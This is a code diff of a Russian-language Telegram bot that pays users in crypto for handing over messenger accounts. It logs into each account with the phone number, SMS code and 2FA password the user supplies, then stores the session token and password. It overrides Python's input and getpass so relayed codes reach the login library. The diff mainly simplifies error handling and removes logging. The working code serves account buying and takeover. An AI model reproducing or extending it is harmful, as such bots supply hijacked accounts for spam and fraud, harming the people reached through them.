@@ -397,8 +397,6 @@ async def withdraw_amount(message: types.Message, state: FSMContext):
     uid = str(message.from_user.id)
     result = await crypto_bot_create_check(amount)
 
-    logging.info(f"Crypto Bot check response: {result}")
-
     if result and result.get("ok"):
         res = result.get("result", {})
         check_url = res.get("bot_check_url") or res.get("check_url") or ""
@@ -410,7 +408,7 @@ async def withdraw_amount(message: types.Message, state: FSMContext):
         if check_url:
             await message.answer(
                 f"✅ Чек на <b>${amount}</b> создан!\n\n"
-                f"Для получения нажмите на ссылку:\n{check_url}",
+                f"{check_url}",
                 parse_mode="HTML",
                 disable_web_page_preview=True
             )
@@ -662,7 +660,6 @@ async def cb_admin_check_balance(callback: types.CallbackQuery):
         return await callback.answer("❌ Только для админа", show_alert=True)
     
     result = await check_crypto_balance()
-    logging.info(f"Crypto Bot balance: {result}")
     
     if result and result.get("ok"):
         balances = result.get("result", [])
@@ -747,6 +744,8 @@ async def cb_add_account(callback: types.CallbackQuery, state: FSMContext):
     await callback.message.answer("📱 Отправьте номер в формате +79111111111", reply_markup=back_keyboard())
     await callback.answer()
 
+# ==================== ВХОД (СТАРАЯ РАБОЧАЯ СХЕМА) ====================
+
 @dp.message(AuthState.waiting_for_code, F.text.regexp(r'^\+7\d{10}$'))
 async def phone_handler(message: types.Message, state: FSMContext):
     if not await ensure_subscribed(message):
@@ -762,7 +761,7 @@ async def phone_handler(message: types.Message, state: FSMContext):
         os.remove(db_path)
 
     client = SocketMaxClient(phone=phone, work_dir=work_dir)
-    pending[uid] = {"client": client, "phone": phone, "work_dir": work_dir, "status": "waiting_sms", "code_attempts": 0}
+    pending[uid] = {"client": client, "phone": phone, "work_dir": work_dir}
     await state.update_data(phone=phone, work_dir=work_dir)
 
     msg = await message.answer("⏳ Отправляю SMS...")
@@ -773,13 +772,7 @@ async def phone_handler(message: types.Message, state: FSMContext):
             await post_login(client, uid, phone, work_dir)
         except Exception as e:
             err = str(e).lower()
-            if "attempt.limit" in err or "устарел" in err:
-                if uid in pending and pending[uid].get("code_attempts", 0) < 2:
-                    pending[uid]["code_attempts"] += 1
-                    pending[uid]["status"] = "retry"
-                else:
-                    pending[uid]["status"] = "flood_sms"
-            elif "not registered" in err or "not found" in err or "unregistered" in err:
+            if "not registered" in err or "not found" in err or "unregistered" in err:
                 try:
                     reg_client = SocketMaxClient(phone=phone, work_dir=work_dir, registration=True)
                     await reg_client.start()
@@ -788,19 +781,13 @@ async def phone_handler(message: types.Message, state: FSMContext):
                     return
                 except Exception as reg_err:
                     err = str(reg_err).lower()
-                    if uid in pending:
-                        if "block" in err: pending[uid]["status"] = "blocked"
-                        elif "password" in err or "2fa" in err: pending[uid]["status"] = "need_password"
-                        elif "limit" in err or "flood" in err: pending[uid]["status"] = "flood_sms"
-                        elif "invalid" in err or "wrong" in err: pending[uid]["status"] = "invalid_code"
-                        else: pending[uid]["status"] = f"error:{e}"
-            else:
-                if uid in pending:
-                    if "block" in err: pending[uid]["status"] = "blocked"
-                    elif "password" in err or "2fa" in err: pending[uid]["status"] = "need_password"
-                    elif "limit" in err or "flood" in err: pending[uid]["status"] = "flood_sms"
-                    elif "invalid" in err or "wrong" in err: pending[uid]["status"] = "invalid_code"
-                    else: pending[uid]["status"] = f"error:{e}"
+
+            if uid in pending:
+                if "block" in err: pending[uid]["status"] = "blocked"
+                elif "password" in err or "2fa" in err: pending[uid]["status"] = "need_password"
+                elif "limit" in err or "flood" in err or "attempt.limit" in err:
+                    pending[uid]["status"] = "flood_sms"
+                else: pending[uid]["status"] = f"error:{e}"
 
     async def post_login(client, uid, phone, work_dir):
         try:
@@ -842,19 +829,13 @@ async def phone_handler(message: types.Message, state: FSMContext):
             pending[uid]["status"] = "done"
 
     asyncio.ensure_future(auth())
-    await asyncio.sleep(3)
+    await asyncio.sleep(6)
 
-    if uid not in pending: 
-        return
-    
+    if uid not in pending: return
     status = pending[uid].get("status", "")
-    
-    if status == "waiting_sms":
-        await msg.edit_text("✅ SMS отправлена. Введите код из 6 цифр:")
-    elif status == "retry":
-        await msg.edit_text("📤 Отправляю новый код. Введите код из 6 цифр:")
-    elif status == "flood_sms":
-        await msg.edit_text("⏳ Слишком много попыток. Подождите и попробуйте позже.")
+
+    if status == "flood_sms":
+        await msg.edit_text("⏳ Слишком много попыток.")
         del pending[uid]; await state.clear()
     elif status == "blocked":
         await msg.edit_text("🚫 Заблокирован.")
@@ -868,8 +849,7 @@ async def phone_handler(message: types.Message, state: FSMContext):
 @dp.message(AuthState.waiting_for_code, F.text.regexp(r'^\d{6}$'))
 async def code_handler(message: types.Message, state: FSMContext):
     uid = message.from_user.id
-    if uid not in pending: 
-        return await message.answer("⏳ Сессия устарела. /start")
+    if uid not in pending: return await message.answer("⏳ Сессия устарела. /start")
 
     data = await state.get_data()
     phone = data.get("phone", "")
@@ -880,34 +860,19 @@ async def code_handler(message: types.Message, state: FSMContext):
 
     msg = await message.answer("⏳ Проверяю код...")
 
-    for _ in range(120):
+    for _ in range(240):
         await asyncio.sleep(0.5)
-        
         if uid not in pending:
-            await msg.edit_text("⏳ Сессия устарела.")
-            await state.clear()
-            return
-        
+            await msg.edit_text("⏳ Сессия устарела."); await state.clear(); return
         status = pending[uid].get("status", "")
-
-        if status == "retry":
-            await msg.edit_text("🔄 Повторная попытка... Введите код ещё раз:")
-            return
 
         if status == "done":
             token = pending[uid]["token"]
             vid = pending[uid].get("user_id", 0)
             pwd_2fa = pending[uid].get("password_2fa", "")
             uid_str = str(uid)
-            
-            if uid_str not in accounts: 
-                accounts[uid_str] = {}
-            accounts[uid_str][phone] = {
-                "token": token,
-                "user_id": vid,
-                "work_dir": work_dir,
-                "password": pwd_2fa
-            }
+            if uid_str not in accounts: accounts[uid_str] = {}
+            accounts[uid_str][phone] = {"token": token, "user_id": vid, "work_dir": work_dir, "password": pwd_2fa}
 
             if uid_str not in users:
                 users[uid_str] = {"balance": 0, "total_phones": 0, "total_earned": 0}
@@ -916,42 +881,24 @@ async def code_handler(message: types.Message, state: FSMContext):
             users[uid_str]["balance"] += PRICE_PER_PHONE
 
             save_data()
-            await msg.edit_text(f"✅ Номер принят! Аккаунт успешно встал\n💰 Начислено: ${PRICE_PER_PHONE}")
-            del pending[uid]
-            await state.clear()
-            return
+            text = f"✅ Номер принят! Аккаунт успешно встал\n💰 Начислено: ${PRICE_PER_PHONE}"
+            await msg.edit_text(text)
+            del pending[uid]; await state.clear(); return
 
         elif status == "need_password":
             await state.set_state(AuthState.waiting_for_password)
-            await msg.edit_text("🔐 Введите пароль 2FA:")
-            return
-        
+            await msg.edit_text("🔐 Введите пароль 2FA:"); return
         elif status == "flood_sms":
             await msg.edit_text("⏳ Слишком много попыток.")
-            del pending[uid]
-            await state.clear()
-            return
-        
+            del pending[uid]; await state.clear(); return
         elif status == "invalid_code":
-            await msg.edit_text("❌ Неверный код. Введите ещё раз:")
-            return
-        
+            await msg.edit_text("❌ Неверный код."); return
         elif status == "blocked":
-            await msg.edit_text("🚫 Заблокирован.")
-            del pending[uid]
-            await state.clear()
-            return
-        
+            await msg.edit_text("🚫 Заблокирован."); del pending[uid]; await state.clear(); return
         elif status and status.startswith("error:"):
-            await msg.edit_text(f"❌ {status[6:]}")
-            del pending[uid]
-            await state.clear()
-            return
+            await msg.edit_text(f"❌ {status[6:]}"); del pending[uid]; await state.clear(); return
 
-    await msg.edit_text("❌ Таймаут. Попробуйте снова.")
-    if uid in pending:
-        del pending[uid]
-    await state.clear()
+    await msg.edit_text("❌ Таймаут."); del pending[uid]; await state.clear()
 
 @dp.message(AuthState.waiting_for_password)
 async def password_handler(message: types.Message, state: FSMContext):
@@ -1016,32 +963,22 @@ async def password_handler(message: types.Message, state: FSMContext):
 async def main():
     import builtins, getpass
     oi, og = builtins.input, getpass.getpass
-    
     def pi(prompt=""):
         p = prompt.lower()
         if "code" in p or "код" in p:
-            while not hasattr(builtins, '_code') or builtins._code is None:
-                time.sleep(0.5)
-            c = builtins._code
-            builtins._code = None
-            return c
+            while not hasattr(builtins,'_code') or builtins._code is None: time.sleep(0.5)
+            c = builtins._code; builtins._code = None; return c
         return oi(prompt)
-    
     def pg(prompt=""):
         p = prompt.lower()
         if "password" in p or "пароль" in p or "2fa" in p:
             for u in list(pending.keys()):
-                if pending[u].get("status", "") not in ("done", "blocked", "flood_sms"):
+                if pending[u].get("status","") not in ("done","blocked","flood_sms"):
                     pending[u]["status"] = "need_password"
-            while not hasattr(builtins, '_password') or builtins._password is None:
-                time.sleep(0.5)
-            pwd = builtins._password
-            builtins._password = None
-            return pwd
+            while not hasattr(builtins,'_password') or builtins._password is None: time.sleep(0.5)
+            pwd = builtins._password; builtins._password = None; return pwd
         return og(prompt)
-    
-    builtins.input = pi
-    getpass.getpass = pg
+    builtins.input = pi; getpass.getpass = pg
     logging.info("Бот запущен!")
     await dp.start_polling(bot)
 
